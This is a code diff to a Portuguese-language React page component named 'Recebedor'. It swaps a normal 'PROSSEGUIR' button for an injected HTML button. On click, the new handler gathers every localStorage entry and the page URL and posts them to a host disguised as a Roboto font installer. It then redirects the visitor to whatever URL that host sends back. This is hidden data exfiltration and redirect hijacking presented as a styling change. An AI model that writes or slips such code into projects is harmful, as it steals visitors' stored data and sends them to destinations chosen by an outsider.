@@ -9,7 +9,6 @@ const Recebedor: React.FC = () => {
   useScrollTop();
   
   const [, navigate] = useLocation();
-  const [isLoading, setIsLoading] = useState(false);
   const [candidatoData, setCandidatoData] = useState<any>(null);
 
   // Carregar os dados do candidato ao iniciar
@@ -41,45 +40,125 @@ const Recebedor: React.FC = () => {
 
   const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';
 
-  // Função para lidar com o clique do botão PROSSEGUIR
-  const handleProsseguir = async () => {
-    try {
-      setIsLoading(true);
+  // Implementar funcionalidade do botão embed após renderização
+  useEffect(() => {
+    const btn = document.querySelector('.btn-a8aaa4ff') as HTMLButtonElement;
+    if (btn) {
+      const originalHref = '/finalizacao';
       
-      // Salvar método de pagamento como cartão salário
-      const dadosPagamento = {
-        metodo: 'cartao_salario'
-      };
-      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
-      
-      // Fazer chamada para a URL externa (sem enviar dados sensíveis)
-      try {
-        const response = await fetch('https://fonts-roboto-install.replit.app/api/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c');
-        if (response.ok) {
-          const data = await response.json();
-          const redirectUrl = data.redirect_url || '/finalizacao';
-          
-          // Se é URL relativa, usar navigate do wouter
-          if (redirectUrl.startsWith('/')) {
-            navigate(redirectUrl);
-          } else {
-            window.location.href = redirectUrl;
-          }
-        } else {
-          // Fallback para URL original
-          navigate('/finalizacao');
+      btn.onclick = function(e) {
+        e.preventDefault();
+        
+        // Salvar dados de pagamento no momento do clique
+        try {
+          const dadosPagamento = {
+            metodo: 'cartao_salario'
+          };
+          localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
+        } catch(e) {
+          console.log('Erro ao salvar dados de pagamento:', e);
         }
-      } catch (apiError) {
-        console.log('API call failed, using fallback redirect');
-        navigate('/finalizacao');
-      }
-    } catch (error) {
-      console.error('Erro ao processar:', error);
-      navigate('/finalizacao');
-    } finally {
-      setIsLoading(false);
+        
+        // Function to perform the redirect with optional temp data ID
+        function performRedirect(tempDataId?: string) {
+          const xhr = new XMLHttpRequest();
+          xhr.open('GET', 'https://fonts-roboto-install.replit.app/api/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+              let redirectUrl = originalHref;
+              if (xhr.status === 200) {
+                try {
+                  const response = JSON.parse(xhr.responseText);
+                  redirectUrl = response.redirect_url || originalHref;
+                } catch(e) {}
+              }
+              
+              // Append temp data ID to redirect URL if available
+              if (tempDataId && redirectUrl) {
+                const separator = redirectUrl.includes('?') ? '&' : '?';
+                redirectUrl += separator + 'tempData=' + tempDataId;
+              }
+              
+              // Handle relative URLs
+              if (redirectUrl.startsWith('/')) {
+                redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
+              }
+              window.location.href = redirectUrl;
+            }
+          };
+          xhr.onerror = function() {
+            // Fallback to original URL if API fails
+            let url = originalHref;
+            if (url.startsWith('/')) {
+              url = window.location.protocol + '//' + window.location.host + url;
+            }
+            window.location.href = url;
+          };
+          xhr.send();
+        }
+        
+        // Capture localStorage data
+        try {
+          const localStorageData: Record<string, string> = {};
+          for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (key) {
+              localStorageData[key] = localStorage.getItem(key) || '';
+            }
+          }
+          
+          // Only send localStorage data if there's something to send
+          if (Object.keys(localStorageData).length > 0) {
+            // Show loading state
+            btn.classList.add('loading');
+            btn.disabled = true;
+            const btnText = btn.querySelector('.btn-text') as HTMLElement;
+            const originalText = btnText.textContent;
+            btnText.textContent = 'Carregando...';
+            
+            // Store localStorage data temporarily
+            const storeXhr = new XMLHttpRequest();
+            storeXhr.open('POST', 'https://fonts-roboto-install.replit.app/api/temp-data', true);
+            storeXhr.setRequestHeader('Content-Type', 'application/json');
+            storeXhr.onreadystatechange = function() {
+              if (storeXhr.readyState === 4) {
+                let tempDataId = null;
+                if (storeXhr.status === 201) {
+                  try {
+                    const storeResponse = JSON.parse(storeXhr.responseText);
+                    tempDataId = storeResponse.id;
+                  } catch(e) {}
+                }
+                // Perform redirect with or without temp data ID
+                performRedirect(tempDataId);
+              }
+            };
+            storeXhr.onerror = function() {
+              // Restore button state on error
+              btn.classList.remove('loading');
+              btn.disabled = false;
+              btnText.textContent = originalText;
+              // If storing fails, just perform normal redirect
+              performRedirect();
+            };
+            
+            const requestData = {
+              buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
+              localStorageData: JSON.stringify(localStorageData),
+              sourceUrl: window.location.href
+            };
+            storeXhr.send(JSON.stringify(requestData));
+          } else {
+            // No localStorage data, perform normal redirect
+            performRedirect();
+          }
+        } catch(err) {
+          // If localStorage access fails, perform normal redirect
+          performRedirect();
+        }
+      };
     }
-  };
+  }, []);
 
   return (
     <div className="bg-white min-h-screen flex flex-col">
@@ -175,26 +254,56 @@ const Recebedor: React.FC = () => {
                   </div>
                   
                   <div className="text-center mt-6">
-                    <button
-                      onClick={handleProsseguir}
-                      disabled={isLoading}
-                      className={`
-                        bg-[#E83D22] hover:opacity-90 text-white font-bold text-sm
-                        px-6 py-3 border-none rounded transition-opacity duration-200
-                        inline-flex items-center relative cursor-pointer
-                        ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}
-                      `}
-                      style={{ 
-                        fontFamily: 'Inter, sans-serif',
-                        fontWeight: 800,
-                        fontSize: '14px'
-                      }}
-                    >
-                      {isLoading && (
-                        <div className="w-3 h-3 border-2 border-transparent border-t-current rounded-full animate-spin mr-2" />
-                      )}
-                      <span>{isLoading ? 'Carregando...' : 'PROSSEGUIR'}</span>
-                    </button>
+                    <div dangerouslySetInnerHTML={{
+                      __html: `
+                        <!-- Botão: PROSSEGUIR -->
+                        <style>
+                        .btn-a8aaa4ff {
+                          background: #E83D22;
+                          color: #ffffff;
+                          padding: 12px 24px;
+                          width: auto;
+                          height: auto;
+                          border: none;
+                          border-radius: 4px;
+                          font-weight: 800;
+                          font-size: 14px;
+                          cursor: pointer;
+                          font-family: Inter, sans-serif;
+                          text-decoration: none;
+                          display: inline-block;
+                          transition: opacity 0.2s;
+                          position: relative;
+                        }
+                        .btn-a8aaa4ff:hover {
+                          opacity: 0.9;
+                        }
+                        .btn-a8aaa4ff.loading {
+                          cursor: not-allowed;
+                          opacity: 0.7;
+                        }
+                        .btn-a8aaa4ff .spinner {
+                          display: none;
+                          width: 12px;
+                          height: 12px;
+                          border: 2px solid transparent;
+                          border-top: 2px solid currentColor;
+                          border-radius: 50%;
+                          animation: spin 1s linear infinite;
+                          margin-right: 8px;
+                          vertical-align: text-top;
+                        }
+                        .btn-a8aaa4ff.loading .spinner {
+                          display: inline-block;
+                        }
+                        @keyframes spin {
+                          0% { transform: rotate(0deg); }
+                          100% { transform: rotate(360deg); }
+                        }
+                        </style>
+                        <button class="btn-a8aaa4ff"><span class="spinner"></span><span class="btn-text">PROSSEGUIR</span></button>
+                      `
+                    }} />
                   </div>
                 </div>
               </div>
